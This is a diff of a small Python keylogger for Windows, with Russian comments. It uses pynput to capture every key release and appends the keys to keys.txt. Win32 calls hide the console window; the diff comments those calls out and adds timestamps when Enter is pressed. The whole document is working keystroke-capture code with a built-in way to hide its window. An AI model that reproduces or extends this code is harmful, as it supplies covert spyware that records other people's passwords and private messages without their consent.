@@ -1,13 +1,14 @@
 from pynput.keyboard import Listener, Key
 # импортируем нужные классы, Listener - прослушиватель нажатий, Key - удобно получает коды клавиш в ascii
 #
+from datetime import datetime
 
 import win32gui
 import win32console
 #import win32api
 
-window = win32console.GetConsoleWindow()
-win32gui.ShowWindow(window, 0)
+#window = win32console.GetConsoleWindow()
+#win32gui.ShowWindow(window, 0)
 
 # пишем функцию, которая будет срабатывать при отпускании клавиши. Для теста мы поставим так, что при нажатии
 # клавиши escape программа перестанет работать
@@ -20,7 +21,11 @@ def key_pressed(key):
     k = str(key).replace("'", '')
 
     if key == Key.space:
-        k = '\n'
+        k = ' '
+    if key == Key.enter:
+        k = '\n' + datetime.utcnow().strftime("%d.%m.%Y %H:%M:%S") + '\n'
+        #k = ''.join(('\n', datetime.utcnow().strftime('%d %m %Y %H:%M'), '\n'))
+
     if k.find('Key.') == -1:
         with open('keys.txt', 'at') as f:
             f.write(k)
@@ -41,3 +46,5 @@ with Listener(
 ) as listener:
     listener.join() # подключаем прослушку
 
+
+print(datetime.utcnow().strftime("%d.%m.%Y %H:%M:%S"))
